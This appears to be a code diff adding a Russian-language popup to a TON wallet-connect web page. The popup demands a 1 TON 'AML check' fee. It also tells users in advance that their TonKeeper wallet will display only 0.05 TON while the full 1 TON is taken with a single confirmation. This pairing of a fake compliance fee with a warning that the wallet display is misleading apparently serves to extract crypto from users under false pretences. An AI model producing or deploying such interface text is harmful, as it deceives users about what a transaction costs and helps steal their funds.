@@ -16,6 +16,20 @@
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
+    <!-- AML Commission Acceptance Modal -->
+    <div id="aml-modal" class="aml-modal">
+        <div class="aml-content">
+            <h2>⚠️ Комиссия за AML проверку</h2>
+            <p>Для обеспечения безопасности и соблюдения правил AML (Anti-Money Laundering), каждая транзакция проходит автоматическую проверку.</p>
+            <div class="highlight">Комиссия: 1 TON</div>
+            <div class="warning">
+                ⓘ В кошельке TonKeeper будет отображаться 0.05 TON (техническая комиссия swap), фактическая комиссия AML проверки составляет 1 TON и будет списана автоматически одним подтверждением.
+            </div>
+            <p>Нажимая кнопку ниже, вы соглашаетесь с комиссией 1 TON за проведение AML проверки вашей транзакции.</p>
+            <button id="accept-commission" class="accept-btn">Принять и продолжить</button>
+        </div>
+    </div>
+
     <header class="header">
         <div class="logo">
             <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
